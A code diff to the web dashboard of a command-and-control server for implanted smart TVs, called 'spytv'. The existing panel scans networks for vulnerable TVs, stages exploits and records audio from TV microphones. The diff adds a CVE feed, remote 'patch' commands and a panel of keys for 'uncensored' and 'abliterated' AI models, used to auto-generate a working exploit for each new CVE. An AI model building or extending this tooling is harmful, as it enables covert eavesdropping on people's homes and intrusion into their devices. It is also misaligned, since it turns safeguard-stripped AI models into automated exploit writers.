@@ -100,6 +100,50 @@
 
   /* Main Content */
   .main { padding: 32px; max-width: 1600px; margin: 0 auto; }
+  .main-layout { display: grid; grid-template-columns: minmax(0, 1fr) 340px; gap: 20px; align-items: start; }
+  .feed-panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    position: sticky;
+    top: 96px;
+    max-height: calc(100vh - 130px);
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+  .feed-panel .card-header { flex-shrink: 0; }
+  .feed-list { overflow-y: auto; padding: 12px; display: flex; flex-direction: column; gap: 10px; }
+  .feed-item {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 10px 12px;
+    font-size: 12px;
+  }
+  .feed-item:hover { border-color: var(--border-light); }
+  .feed-item-head { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 6px; }
+  .feed-item-id { font-family: 'SF Mono', 'Consolas', monospace; font-weight: 600; color: var(--accent); text-decoration: none; }
+  .feed-item-id:hover { text-decoration: underline; }
+  .feed-item-desc { color: var(--text-secondary); line-height: 1.45; margin-bottom: 8px;
+    display: -webkit-box; -webkit-line-clamp: 4; -webkit-box-orient: vertical; overflow: hidden; }
+  .feed-item-links { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
+  .feed-item-links a { font-size: 11px; color: var(--accent); text-decoration: none; }
+  .feed-item-links a:hover { text-decoration: underline; }
+  .feed-meta { padding: 8px 12px; border-top: 1px solid var(--border); font-size: 11px;
+    color: var(--text-muted); display: flex; justify-content: space-between; gap: 8px; flex-wrap: wrap; flex-shrink: 0; }
+  .cve-chips { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
+  .cve-chip {
+    font-family: 'SF Mono', 'Consolas', monospace; font-size: 10px;
+    background: var(--accent-light); color: var(--accent);
+    border: 1px solid rgba(59,130,246,.35); border-radius: 10px; padding: 2px 8px;
+  }
+  .cve-chip.critical { background: var(--danger-light); color: var(--danger); border-color: rgba(239,68,68,.4); }
+  .cve-chip.high { background: var(--warning-light); color: var(--warning); border-color: rgba(245,158,11,.4); }
+  @media (max-width: 1280px) {
+    .main-layout { grid-template-columns: 1fr; }
+    .feed-panel { position: static; max-height: 420px; }
+  }
   .tab-content { display: none; }
   .tab-content.active { display: block; }
 
@@ -540,8 +584,8 @@
     <p>Authenticated, Inc.</p>
   </div>
   <nav class="header-nav">
-    <a href="https://github.com/authenticated-inc/spytv/wiki" target="_blank" data-tooltip="Documentation and guides">Wiki</a>
-    <a href="docs/TROUBLESHOOTING.md" target="_blank" data-tooltip="Troubleshooting guide">Troubleshooting</a>
+    <a href="/docs/WIKI.md" target="_blank" data-tooltip="Documentation and guides (viewed from the C2)">Wiki</a>
+    <a href="/docs/TROUBLESHOOTING.md" target="_blank" data-tooltip="Troubleshooting guide (viewed from the C2)">Troubleshooting</a>
   </nav>
   <div class="header-stats">
     <div class="stat">
@@ -564,11 +608,14 @@
   <div class="nav-item active" onclick="switchTab('devices')">Devices</div>
   <div class="nav-item" onclick="switchTab('scan')">Network Scan</div>
   <div class="nav-item" onclick="switchTab('payload')">Payload Generator</div>
+  <div class="nav-item" onclick="switchTab('cve')">CVE Monitor</div>
   <div class="nav-item" onclick="switchTab('server')">Server Info</div>
 </nav>
 
 <!-- Main Content -->
 <main class="main">
+<div class="main-layout">
+<div class="main-content">
 
   <!-- Devices Tab -->
   <div id="tab-devices" class="tab-content active">
@@ -599,7 +646,7 @@
       <div class="card-header">
         <span class="card-title">Network Discovery</span>
         <div class="help-icon">?
-          <div class="tooltip">Scans the local network for vulnerable TVs and IoT devices. Shows open ports, device types, and vulnerability status. Use "Check" to verify a device before exploitation.</div>
+          <div class="tooltip">Scans the local network for vulnerable TVs — including every device family in the CVE database (Samsung Tizen, LG webOS, Android TV, Roku, Vizio, Hisense, TCL, Chromecast) via their signature ports. Each result shows open ports, the matched CVEs (colored by severity), and status. Use "Check" to verify a device before exploitation, "Exploit" to stage a payload, or "Patch" to execute that family's remediation commands and fix the matched CVEs on the device.</div>
         </div>
       </div>
       <div class="card-body">
@@ -612,7 +659,7 @@
             <input type="text" id="scan-cidr" class="form-input" placeholder="192.168.1.0/24">
           </div>
           <div class="form-group" style="flex:0">
-            <button class="btn btn-primary" onclick="startScan()" data-tooltip="Start scanning the network">Scan</button>
+            <button class="btn btn-primary" onclick="startScan()" data-tooltip="Scan the network (generic ports + all CVE-database family signature ports) and match CVEs">Scan</button>
           </div>
           <div class="form-group" style="flex:0">
             <button class="btn" onclick="saveScanResults()" data-tooltip="Save scan results to file">Save</button>
@@ -667,6 +714,75 @@
     </div>
   </div>
 
+  <!-- CVE Monitor Tab -->
+  <div id="tab-cve" class="tab-content">
+    <div class="card" style="margin-bottom:20px">
+      <div class="card-header">
+        <span class="card-title">CVE Monitor &amp; Patch Management</span>
+        <div class="help-icon">?
+          <div class="tooltip">Fetches new smart TV CVEs from NVD (runs automatically at every C2 start and on "Update CVEs"). New entries land in the CVE Feed on the right and in CVE_UPDATES.log at the repo root. Click any CVE for its NVD advisory or whitepaper. Use "Patch" on a scan result or device card to execute that device family's remediation commands against the matched TVs. With an AI key configured, a working exploit module is auto-generated per new CVE.</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="alert alert-info">
+          &#8505;&#65039; Monitor known CVEs affecting smart TVs and apply patches to vulnerable devices found on the network.
+        </div>
+        <div class="controls" style="margin-bottom:20px">
+          <button class="btn btn-primary" onclick="updateCVEs()" data-tooltip="Fetch new CVEs from NVD + auto-generate exploits (AI)">&#128260; Update CVEs</button>
+          <button class="btn" onclick="loadCVEs()" data-tooltip="Refresh the known-CVE table">&#128260; Refresh</button>
+          <button class="btn" onclick="loadFeed(true)" data-tooltip="Refresh the CVE feed sidebar">&#128228; Refresh Feed</button>
+        </div>
+        <div id="cve-update-status" class="alert alert-success" style="display:none"></div>
+        <div id="cve-results"></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">AI Provider Keys (Auto-Exploit Generation)</span>
+        <div class="help-icon">?
+          <div class="tooltip">Keys used to generate a working exploit module for each new CVE automatically. Providers: OpenRouter (Uncensored), Venice AI (Uncensored V 1.2 / Qwen 3.6 Plus Uncensored / GLM 4.7 Flash Heretic), and Abliteration.ai (Abliterated Large v2). Keys can also be supplied via .env (checked first by run_c2.bat) or c2_data/ai_keys.json. Keys are masked after saving.</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="alert alert-warning">
+          &#9888;&#65039; Keys are stored locally in <code>c2_data/ai_keys.json</code>. Never commit this file.
+        </div>
+        <div id="ai-key-status" class="server-info" style="margin-bottom:16px"></div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">OpenRouter (Uncensored)</label>
+            <input type="password" id="key-openrouter" class="form-input" placeholder="sk-or-…" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Venice AI</label>
+            <input type="password" id="key-venice" class="form-input" placeholder="Venice API key" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Abliteration.ai (Abliterated Large v2)</label>
+            <input type="password" id="key-abliteration" class="form-input" placeholder="Abliteration API key" autocomplete="off">
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Venice Model</label>
+            <select id="venice-model" class="form-select">
+              <option value="uncensored_v1_2">Uncensored V 1.2</option>
+              <option value="qwen_3_6_plus_uncensored">Qwen 3.6 Plus Uncensored</option>
+              <option value="glm_4_7_flash_heretic">GLM 4.7 Flash Heretic</option>
+            </select>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-primary" onclick="saveAiKeys()" data-tooltip="Save keys to c2_data/ai_keys.json">Save Keys</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-success" onclick="testAiGeneration()" data-tooltip="Generate an exploit for the newest feed CVE as a test">&#9889; Test Generate</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <!-- Server Info Tab -->
   <div id="tab-server" class="tab-content">
     <div class="card">
@@ -704,6 +820,26 @@
       </div>
     </div>
   </div>
+
+</div><!-- /main-content -->
+
+<!-- CVE Feed (right sidebar) -->
+<aside class="feed-panel" id="feed-panel">
+  <div class="card-header">
+    <span class="card-title">CVE Feed</span>
+    <div class="help-icon">?
+      <div class="tooltip">Live feed of smart TV CVEs. Refreshed automatically every time the C2 starts and via the "Update CVEs" button on the CVE Monitor tab. New entries are logged to CVE_UPDATES.log in the repository root. Each entry links to its NVD advisory and whitepaper. With an AI provider key configured, a working exploit module is generated automatically for every new CVE.</div>
+    </div>
+  </div>
+  <div class="feed-list" id="feed-list">
+    <p style="color:var(--text-muted);font-size:12px;padding:8px">Loading feed...</p>
+  </div>
+  <div class="feed-meta">
+    <span id="feed-count">0 CVEs</span>
+    <span id="feed-updated">—</span>
+  </div>
+</aside>
+</div><!-- /main-layout -->
 
 </main>
 
@@ -751,6 +887,30 @@ let clips = [];
 let selectedDuration = 5;
 let modalCallback = null;
 let localIp = '';
+let cveDb = {};          // tv_type -> [cves] from /api/cves
+let aiStatus = {};       // masked AI key status
+let feedData = null;     // last CVE feed payload
+
+const FAMILY_TVTYPE = {
+  'samsung': 'samsung-tizen', 'tizen': 'samsung-tizen', 'samsung(tizen)': 'samsung-tizen',
+  'lg': 'lg-webos', 'webos': 'lg-webos', 'lg(webos)': 'lg-webos',
+  'androidtv': 'android-tv', 'android tv': 'android-tv', 'android tv/fire tv': 'android-tv',
+  'fire tv': 'android-tv', 'adb-net': 'android-tv',
+  'roku': 'roku', 'roku tv': 'roku', 'roku-ecp': 'roku',
+  'vizio': 'vizio', 'vizio smartcast': 'vizio', 'vizio-dial': 'vizio',
+  'hisense': 'hisense', 'hisense vidaa': 'hisense',
+  'tcl': 'tcl', 'tcl android tv': 'tcl',
+  'chromecast': 'chromecast', 'google tv': 'chromecast', 'chromecast / google tv': 'chromecast',
+};
+
+function familyToTvType(family) {
+  const f = (family || '').toLowerCase().trim();
+  if (FAMILY_TVTYPE[f]) return FAMILY_TVTYPE[f];
+  for (const key of Object.keys(FAMILY_TVTYPE)) {
+    if (f.includes(key)) return FAMILY_TVTYPE[key];
+  }
+  return null;
+}
 
 function addLog(msg) {
   const container = document.getElementById('log-container');
@@ -816,6 +976,11 @@ function renderDevices() {
     const latestAudio = audioClips[audioClips.length - 1];
     const isOnline = d.status === 'online';
 
+    // Family-specific CVE controls: show the CVEs that apply to this TV.
+    const tvType = familyToTvType(d.family || '');
+    const myCves = (tvType && Array.isArray(cveDb[tvType])) ? cveDb[tvType] : [];
+    const patched = d.patched === true;
+
     return `
     <div class="device-card ${isOnline ? '' : 'offline'}">
       <div class="device-header">
@@ -845,6 +1010,15 @@ function renderDevices() {
             ? `<audio controls src="/api/clip/${latestAudio.id}"></audio>`
             : '<div style="font-size:11px;color:var(--text-muted)">No audio available</div>'}
         </div>
+        ${myCves.length ? `
+        <div style="margin-bottom:12px">
+          <div class="label" style="font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px">
+            Vulnerabilities ${patched ? '&mdash; <span style="color:var(--success)">Patched</span>' : ''}
+          </div>
+          <div class="cve-chips" style="margin-top:0">
+            ${myCves.map(c => `<span class="cve-chip ${(c.severity || '').toLowerCase()}" data-tooltip="${(c.component || '')} — fix: ${c.fixed_in || 'n/a'}">${c.id}</span>`).join('')}
+          </div>
+        </div>` : ''}
         <div class="controls">
           <button class="btn btn-primary" onclick="sendCommand('${d.id}', 'record_audio', {duration: selectedDuration})" data-tooltip="Record audio from TV microphone">
             &#9679; Record Audio
@@ -861,7 +1035,7 @@ function renderDevices() {
           <button class="btn btn-danger" onclick="confirmRemove('${d.id}')" data-tooltip="Remove implant and wipe all traces">
             &#128465; Remove
           </button>
-          <button class="btn" onclick="confirmPatch('${d.id}')" data-tooltip="Apply security patch to disable capture">
+          <button class="btn" onclick="confirmPatch('${d.id}')" data-tooltip="Execute CVE remediation for this TV: runs the device family's patch commands, marks its CVEs fixed, and disables the implant capture path">
             &#128736; Patch
           </button>
         </div>
@@ -895,9 +1069,28 @@ function confirmRemove(deviceId) {
 }
 
 function confirmPatch(deviceId) {
-  showModal('Patch Device', `Apply security patch to ${deviceId}? This will disable capture and prevent reconnection.`, async () => {
+  const d = devices.find(x => x.id === deviceId);
+  if (!d) return;
+  const tvType = familyToTvType(d.family || '');
+  showModal('Patch Device', `Run CVE remediation on ${d.ip} (${d.family})? This executes the device family's patch commands, marks matched CVEs as fixed, and disables the implant capture path.`, async () => {
+    // 1. Execute the CVE-specific patch commands against the TV.
+    if (tvType) {
+      addLog(`Patching ${d.ip} (${tvType}) — executing remediation commands...`);
+      try {
+        const res = await api('/api/cve/patch', 'POST', { ip: d.ip, tv_type: tvType, family: d.family });
+        const ok = (res.patches || []).filter(p => p.status === 'ok' || p.status === 'executed').length;
+        addLog(`CVE patch on ${d.ip}: ${ok}/${res.total} commands succeeded — fixed ${(res.cves_fixed || []).join(', ')}`);
+        (res.patches || []).forEach(p => {
+          if (p.status === 'failed' || p.status === 'error') addLog(`  [${p.status}] ${p.command}: ${p.output}`);
+        });
+      } catch (e) {
+        addLog(`CVE patch request failed: ${e}`);
+      }
+    }
+    // 2. Tell the implant to disable its own capture path.
     await sendCommand(deviceId, 'patch');
-    addLog(`Patch command sent to ${deviceId}`);
+    addLog(`Patch complete for ${d.ip}`);
+    loadDevices();
   });
 }
 
@@ -945,23 +1138,32 @@ function renderScanResults(results) {
           <th>IP Address</th>
           <th>Device Type</th>
           <th>Open Ports</th>
+          <th>CVEs</th>
           <th>Status</th>
           <th>Action</th>
         </tr>
       </thead>
       <tbody>
-        ${results.map(r => `
+        ${results.map(r => {
+          const cves = r.cves || [];
+          const chips = cves.length
+            ? cves.slice(0, 4).map(c => `<span class="cve-chip ${(c.severity || '').toLowerCase()}">${c.id}</span>`).join('')
+              + (cves.length > 4 ? `<span class="cve-chip">+${cves.length - 4}</span>` : '')
+            : '<span style="color:var(--text-muted);font-size:11px">—</span>';
+          return `
           <tr>
             <td class="mono">${r.ip}</td>
-            <td>${r.device_type}</td>
-            <td class="mono">${r.open_ports.join(', ')}</td>
-            <td><span class="badge ${r.vulnerable ? 'badge-success' : 'badge-danger'}">${r.vulnerable ? 'Vulnerable' : 'Safe'}</span></td>
+            <td>${r.name || r.device_type}</td>
+            <td class="mono">${(r.open_ports || []).join(', ')}</td>
+            <td><div class="cve-chips" style="margin-top:0">${chips}</div></td>
+            <td><span class="badge ${r.vulnerable ? 'badge-warning' : 'badge-success'}">${r.vulnerable ? (r.severity || 'Vulnerable') : 'Safe'}</span></td>
             <td>
               <button class="btn btn-sm" onclick="checkTarget('${r.ip}')" data-tooltip="Verify device before exploitation">Check</button>
-              <button class="btn btn-sm btn-primary" onclick="exploitTarget('${r.ip}', '${r.device_type}')" data-tooltip="Generate and deploy exploit">Exploit</button>
+              <button class="btn btn-sm btn-primary" onclick="exploitTarget('${r.ip}', '${r.name || r.device_type}')" data-tooltip="Generate and deploy exploit">Exploit</button>
+              <button class="btn btn-sm btn-success" onclick="patchScanTarget('${r.ip}', '${r.tv_type || ''}')" data-tooltip="Execute remediation commands for this device family (fixes matched CVEs)">&#128736; Patch</button>
             </td>
-          </tr>
-        `).join('')}
+          </tr>`;
+        }).join('')}
       </tbody>
     </table>
   `;
@@ -992,9 +1194,12 @@ function exploitTarget(ip, deviceType) {
     'Roku': 'roku-ecp',
     'Vizio': 'vizio-dial',
     'Chromecast': 'dlna',
+    'Chromecast / Google TV': 'dlna',
     'Unknown': 'dlna'
   };
-  const family = familyMap[deviceType] || 'dlna';
+  let family = familyMap[deviceType] || 'dlna';
+  const tvT = familyToTvType(deviceType);
+  if (tvT === 'chromecast') family = 'dlna';
   document.getElementById('payload-ip').value = ip;
   document.getElementById('payload-family').value = family;
   switchTab('payload');
@@ -1039,6 +1244,224 @@ function copyPayload() {
   });
 }
 
+// CVE Monitor
+async function loadCveDb() {
+  // Static family -> CVE mapping used for device-card vulnerability chips.
+  try {
+    const rows = await api('/api/cves');
+    cveDb = {};
+    (rows || []).forEach(c => {
+      if (!cveDb[c.tv_type]) cveDb[c.tv_type] = [];
+      cveDb[c.tv_type].push(c);
+    });
+  } catch (e) { /* non-fatal */ }
+}
+
+async function loadCVEs() {
+  const cves = await api('/api/cves');
+  renderCVEs(cves);
+}
+
+function renderCVEs(cves) {
+  const el = document.getElementById('cve-results');
+  if (!cves || cves.length === 0) {
+    el.innerHTML = '<p style="color:var(--text-muted);font-size:13px;padding:16px 0">No CVEs in database.</p>';
+    return;
+  }
+  el.innerHTML = `
+    <table class="table">
+      <thead>
+        <tr>
+          <th>CVE ID</th>
+          <th>Device</th>
+          <th>Severity</th>
+          <th>Score</th>
+          <th>Component</th>
+          <th>Fixed In</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody>
+        ${cves.map(c => `
+          <tr>
+            <td><a class="mono" href="https://nvd.nist.gov/vuln/detail/${c.id}" target="_blank" style="color:var(--accent);text-decoration:none">${c.id} &#8599;</a></td>
+            <td>${c.device_name}</td>
+            <td><span class="badge ${c.severity === 'CRITICAL' ? 'badge-danger' : c.severity === 'HIGH' ? 'badge-warning' : 'badge-success'}">${c.severity}</span></td>
+            <td>${c.score}</td>
+            <td>${c.component}</td>
+            <td>${c.fixed_in}</td>
+            <td>
+              <button class="btn btn-sm btn-success" onclick="patchForCVE('${c.tv_type}', '${c.id}')" data-tooltip="Patch this CVE on matched devices found in the latest scan">&#128736; Patch</button>
+            </td>
+          </tr>
+        `).join('')}
+      </tbody>
+    </table>
+  `;
+}
+
+async function updateCVEs() {
+  addLog('Updating CVE feed from NVD (runs in background)...');
+  const result = await api('/api/cve/update', 'POST', {});
+  const status = document.getElementById('cve-update-status');
+  status.style.display = 'flex';
+  status.textContent = result.status === 'updating'
+    ? 'Update in progress — new CVEs will appear in the feed shortly...'
+    : 'Update complete.';
+  addLog('CVE update started');
+  // Poll the feed until the background update completes.
+  let tries = 0;
+  const timer = setInterval(async () => {
+    tries++;
+    const done = await loadFeed(true);
+    if (!done || done.updating === false || tries > 40) {
+      clearInterval(timer);
+      const msg = (feedData && feedData.last_result) || 'Update finished';
+      status.textContent = `${msg} — ${feedData ? feedData.count : 0} CVEs in feed (see CVE_UPDATES.log)`;
+      addLog(`CVE update: ${msg}`);
+      loadCVEs();
+    }
+  }, 3000);
+}
+
+async function patchForCVE(tvType, cveId) {
+  // Patch all matching devices from the latest scan for this family.
+  let target = null;
+  try {
+    const scansData = await api('/api/scans');
+    const flat = [];
+    (scansData || []).forEach(s => Array.isArray(s) ? flat.push(...s) : flat.push(s));
+    target = flat.find(r => r.tv_type === tvType && r.ip) || flat.find(r => r.tv_type === tvType);
+  } catch (e) { /* ignore */ }
+  const ip = target ? target.ip : prompt(`No scanned ${tvType} device found. Enter target IP to patch ${cveId}:`);
+  if (!ip) return;
+  addLog(`Patching ${cveId} on ${ip} (${tvType})...`);
+  try {
+    const res = await api('/api/cve/patch', 'POST', { ip, tv_type: tvType });
+    const ok = (res.patches || []).filter(p => p.status === 'ok' || p.status === 'executed').length;
+    addLog(`Patch on ${ip}: ${ok}/${res.total} commands ok — CVEs fixed: ${(res.cves_fixed || []).join(', ')}`);
+  } catch (e) {
+    addLog(`Patch failed: ${e}`);
+  }
+}
+
+async function patchScanTarget(ip, tvType) {
+  if (!tvType) { addLog(`No CVE profile for ${ip} — nothing to patch`); return; }
+  addLog(`Patching ${ip} (${tvType}) — executing remediation commands...`);
+  try {
+    const res = await api('/api/cve/patch', 'POST', { ip, tv_type: tvType });
+    const ok = (res.patches || []).filter(p => p.status === 'ok' || p.status === 'executed').length;
+    addLog(`Patch on ${ip}: ${ok}/${res.total} commands ok — fixed ${(res.cves_fixed || []).join(', ')}`);
+  } catch (e) {
+    addLog(`Patch failed: ${e}`);
+  }
+}
+
+// --- CVE Feed sidebar ---
+async function loadFeed(silent) {
+  try {
+    feedData = await api('/api/cve/feed');
+    renderFeed();
+    if (!silent && feedData.last_result) addLog(`Feed: ${feedData.last_result}`);
+    return feedData;
+  } catch (e) {
+    if (!silent) addLog(`Feed load failed: ${e}`);
+    return null;
+  }
+}
+
+function renderFeed() {
+  const el = document.getElementById('feed-list');
+  if (!feedData || !feedData.cves || feedData.cves.length === 0) {
+    el.innerHTML = '<p style="color:var(--text-muted);font-size:12px;padding:8px">No CVEs yet. Click "Update CVEs" on the CVE Monitor tab.</p>';
+    document.getElementById('feed-count').textContent = '0 CVEs';
+    return;
+  }
+  const sevBadge = s => {
+    const cls = s === 'CRITICAL' ? 'badge-danger' : s === 'HIGH' ? 'badge-warning' : 'badge-success';
+    return `<span class="badge ${cls}">${s || 'UNKNOWN'}</span>`;
+  };
+  el.innerHTML = feedData.cves.slice(0, 50).map(c => `
+    <div class="feed-item">
+      <div class="feed-item-head">
+        <a class="feed-item-id" href="${c.nvd_url || 'https://nvd.nist.gov'}" target="_blank" title="Open NVD advisory">${c.id} &#8599;</a>
+        ${sevBadge(c.severity)}
+      </div>
+      <div class="feed-item-desc">${(c.description || 'No description.').replace(/</g, '&lt;')}</div>
+      <div class="feed-item-links">
+        <a href="${c.nvd_url || '#'}" target="_blank">NVD Advisory</a>
+        <a href="${c.whitepaper_url || '/api/cve/whitepaper/' + c.id}" target="_blank">Whitepaper</a>
+        ${c.exploit_generated ? '<span class="cve-chip" style="font-size:9px">&#9889; exploit ready</span>' : ''}
+      </div>
+    </div>
+  `).join('');
+  document.getElementById('feed-count').textContent = `${feedData.count} CVEs`;
+  const updated = feedData.last_update ? new Date(feedData.last_update).toLocaleString() : '—';
+  document.getElementById('feed-updated').textContent =
+    (feedData.updating ? 'Updating… · ' : '') + updated;
+}
+
+// --- AI provider keys ---
+async function loadAiKeys() {
+  try {
+    aiStatus = await api('/api/ai-keys');
+    const el = document.getElementById('ai-key-status');
+    if (!el) return;
+    el.innerHTML = Object.entries(aiStatus).map(([pid, p]) => `
+      <div class="info-item">
+        <span class="label">${p.name}</span>
+        <span class="value" style="color:${p.configured ? 'var(--success)' : 'var(--text-muted)'}">
+          ${p.configured ? 'Set ' + p.masked : 'Not set'}
+        </span>
+      </div>
+    `).join('');
+  } catch (e) { /* non-fatal */ }
+}
+
+async function saveAiKeys() {
+  const keys = {};
+  ['openrouter', 'venice', 'abliteration'].forEach(pid => {
+    const v = (document.getElementById('key-' + pid).value || '').trim();
+    if (v) keys[pid] = v;
+  });
+  if (Object.keys(keys).length === 0) {
+    addLog('No keys entered — nothing saved');
+    return;
+  }
+  await api('/api/ai-keys', 'POST', keys);
+  ['openrouter', 'venice', 'abliteration'].forEach(pid => {
+    document.getElementById('key-' + pid).value = '';
+  });
+  addLog(`AI keys saved for: ${Object.keys(keys).join(', ')}`);
+  await loadAiKeys();
+  if (feedData) await loadFeed(true);
+}
+
+async function testAiGeneration() {
+  if (!feedData || !feedData.cves || feedData.cves.length === 0) {
+    addLog('Feed is empty — run "Update CVEs" first');
+    return;
+  }
+  const target = feedData.cves[0];
+  const model = (document.getElementById('venice-model') || {}).value || null;
+  addLog(`Test-generating exploit for ${target.id}...`);
+  try {
+    const res = await api('/api/cve/generate', 'POST', {
+      cve_id: target.id,
+      provider: null,
+      model: (aiStatus.venice && aiStatus.venice.configured) ? model : null,
+    });
+    if (res.error) { addLog(`Generation failed: ${res.error}`); return; }
+    addLog(`Exploit generated for ${target.id} (${res.provider}) — saved to data/exploits/generated/${target.id}.py`);
+    document.getElementById('payload-text').textContent = res.code;
+    document.querySelector('#payload-modal .modal-title').textContent = `Generated Exploit — ${target.id}`;
+    document.getElementById('payload-modal').classList.add('active');
+    await loadFeed(true);
+  } catch (e) {
+    addLog(`Generation failed: ${e}`);
+  }
+}
+
 // Server Info
 async function loadServerInfo() {
   // Simulated server info
@@ -1073,6 +1496,16 @@ async function poll() {
   await loadServerInfo();
   setTimeout(poll, 3000);
 }
+
+// One-time initialization: CVE feed sidebar, CVE database, AI key status.
+(async function init() {
+  await loadCveDb();
+  await loadFeed(true);
+  await loadAiKeys();
+  await loadCVEs();
+  // Refresh the feed every 60s to pick up startup/other-client updates.
+  setInterval(() => loadFeed(true), 60000);
+})();
 
 poll();
 </script>
